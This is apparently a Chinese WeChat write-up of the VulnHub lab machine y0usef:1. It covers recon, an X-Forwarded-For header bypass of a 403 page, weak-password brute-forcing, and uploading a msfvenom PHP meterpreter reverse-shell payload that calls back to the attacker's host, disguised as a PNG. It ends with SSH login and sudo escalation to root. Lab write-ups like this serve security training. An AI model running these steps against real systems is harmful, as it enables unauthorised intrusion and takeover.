> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/KYj44PtGAZ8mKO1adWNc6Q)

**点击蓝字**

**关注我们**

**0x00**

靶机信息

靶机：y0usef:1

难度：简单

下载：https://www.vulnhub.com/entry/y0usef-1,624/

**0x01**

靶机信息

使用 arp-scan 工具扫描当前网段，寻找目标靶机 IP

```
arp-scan-l
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylSJdPHHMVibu7jHza0W95Ec6B5jox9tpLibDykoSSBibTD9IVhQE89Wnvg/640?wx_fmt=png)

Nmap 扫描端口

```
nmap-p 1-65535 192.168.5.217
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibyl4Na0Rk28W4iaGeO5cmqIgmrtoicIJIoMfwAUicECiakamcbryK0Trt9QibQ/640?wx_fmt=png)

只开放了 22，80 端口

然而 Dirb 扫描不到目录的可能字典原因

使用 Dirbsearch 扫描目录

```
Python3 dirsearch.py -u http://192.168.5.217 -e php
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylSeOcejJrgxcQJE69IRc4UE4o5Xjc00BE1xKlJu0Cbg1EYD4BuluWLw/640?wx_fmt=png)

发现 3 个页面，后面两个访问页面都一样，访问 adminstration 页面时出现你没有访问文件权限扫描时 403 响应应该资源是存在需要特定条件才能访问到

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibyl0ric98uuxDnpgibLu11txnxVsicAeBELvkxjPchxHj6bE5CSjnz4MBpMg/640?wx_fmt=png)

尝试在请求头加个请求 IP 绕过启动 Burp Suite 抓包进行改请求头为本地地址访问

```
x-forwarede-for: 127.0.0.1
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylQicyCMiaWmicWV5782rAr0E5HLlSBDCsUExvSM51ibT8b33lQJIBs1AGicA/640?wx_fmt=png)

点击发送后果然显示出登录页面了

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylHUrVYYUlAicv4z025JM64eo4iaGiaZia92L6kYay33nWxkqvMWRDXRQBWg/640?wx_fmt=png)

由于只开放了两个端口没什么可以利用的信息只能爆破账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylwIrncMJicoPdQibpIpb6PYDk0aSAH3p4QBbHia3Sn6jvOfdIgjzVWiaMBw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylweHldW1OnBC7qJjvQpswa36dlsprwZOFxdp7N2libae4NR4dSl5ehmg/640?wx_fmt=png)

爆破使用弱口令 top100 字典即可开始结果账号密码全都时 admin 惊呼

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylf6VTL32KTcsst9SPzLQI1fEXrD9tHxHNfWlMwFwvsfWwo7XiadhPkZA/640?wx_fmt=png)

然后直接输入账号密码登录记得请求头加伪造本地 IP 地址，登录成功后会发现有个上传文件地方

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibyl2OYR4ySxOgIdUwCRsLvHgvNZ0Kgcj2iaSCF3zFLDTBAkPZs5SxIP59Q/640?wx_fmt=png)

**0x02**

漏洞利用

使用 msfvenom 生成一个 php 木马

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=攻击机IP LPORT=连接端口 -f raw >shell.php
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylnZQlkJfpIpb3sBSkIuqI5cEh6Ce6I0E2ibSAhRJuiadyM7mBC1lnbGrg/640?wx_fmt=png)

用 msfvenom 生成 php 木马记得去除生成木马前面注释符

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylkhibC7WiaCdak9LFHzxrLG3lhl2f6RdAa0G3RlMwotUIOBEibMW0Bzziag/640?wx_fmt=png)

然后将木马文件伪装成图片然后上传

```
mv shell.phpshell.png
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylwCGt1Ymzxv4zroiaUWWosFI9dicdBXKIgRXFBsic7ibyUKjNX67ApvQWlg/640?wx_fmt=png)

上传完成回显了路径

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylx3PzyPKvBn8oNyCd4lLQ4pg2rRZse3clqSUWAobOnR79OPeASnLiaKw/640?wx_fmt=png)

上传成功后启动 msfconsole 进入监听模块加载生成木马的 payload 然后设置生成马的攻击机 IP 以及监听端口开启攻击

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylZ7Rf6WJU1gX3VMiaktjKmEyW6SQ7e64LHo8hrLbvuH5e1nYzLEnnMBQ/640?wx_fmt=png)

接下来访问上传木马文件路径

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylGQ0Dy5ib6VAo4UTNN34yzibqH0micDXia8VxJRZVgfOMWSBibl8tehFUzibQ/640?wx_fmt=png)

msfconsloe 上线然后查看权限以及反弹真实终端

```
python-c 'import pty;pty.spawn("/bin/bash")'
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylTS8Cb9fgUcp0jtibtwrkTsRcia5ib0gL5ZKu80CgBGk7N7amkIPdZK6mA/640?wx_fmt=png)

访问 / home 目录查看到一个 user.txt 文件内容是 Base64 加密的直接使用 Burp Suite 解密是一个 ssh 用户账号和密码

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibyl2qvK8oBgAlmu862fusYoMXOhibHesJZGAw3ExI96XWib7Iq3P3yMbRPg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylvBanyYTP6t71IRibK50qhDxOxFPk6CiamJRs2AXAOagpeibyOrjGZx6kQ/640?wx_fmt=png)

账号密码为 yousef 和 yousef123

直接 ssh 输入账号密码登录但无法访问 / root 目录需要进行提权

```
ssh yousef@192.168.5.217
```

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylVmgibP78Rn5ljqVDtU7YiciaGJFp7ib6MMeqydXibmG8mEvKBMia9kGCxjpA/640?wx_fmt=png)

**0x03**

靶机提权  

直接 sudo -l 一下结果直接输入的是登录用户密码就验证成功了

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylT0TnWzfklPiaYBGkxOAm4q4adlC6qAZGwLYFQu3nP6iapwfq3iaRY6cOA/640?wx_fmt=png)

然后 sudo su 切换用户就切换到 root 用户直接进入 root 目录下查看 user.txt 文件提权到此结束

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CsfyUN95JnUHmd3wy1H9mibylCibGm0PJEjlrJB9STKgrGDNkZtrpQeAiavKBxK8HfCCLk1OTUQmUbsdQ/640?wx_fmt=png)

 **往期推荐 ·**

  

[Vulnhub 篇 Tomato](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483796&idx=1&sn=1f7ec28258d61d2761627582e8d8ad0e&chksm=eb4ec829dc39413f8a4af153eac211f41d38a23f2823e92037417deea95ecd9aedf57f4a8d29&scene=21#wechat_redirect)  

[Vulnhub 篇 chili](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483773&idx=1&sn=6d0e5dc2f04a1cec1f01b4848a4a1582&chksm=eb4ec8c0dc3941d638f47dcb06959d7ae311a9d5a8d38780f397f899f31766bbadb3606f3f18&scene=21#wechat_redirect)  

[Vulnhub 篇 presidential:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483700&idx=1&sn=5a54f2be75bd9bdf0d3a84367ea8afb2&chksm=eb4ec889dc39419f55e446dafd3e5aa26379cbc24b048b3d7624a3fb510ad87847b828b6e1b4&scene=21#wechat_redirect)  

[Vulnhub 篇 Photographerr:1](http://mp.weixin.qq.com/s?__biz=MzI3ODkyOTYxOA==&mid=2247483673&idx=1&sn=c1f22eebcf5affb13ae324af7a030449&chksm=eb4ec8a4dc3941b21b2078a6e5d84462ac0ae5253b9176c12d9e3d53539ba27e2d8fbe36f85f&scene=21#wechat_redirect)  

  

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/F3c71CW7CseiapNicO7sSibTRDsGL5Z0HFgt3nd9ESb0icEBWylwPMDHNKxmpWTdNcf9bGuvc9yB8XGF4lNeWr3ynA/640?wx_fmt=png)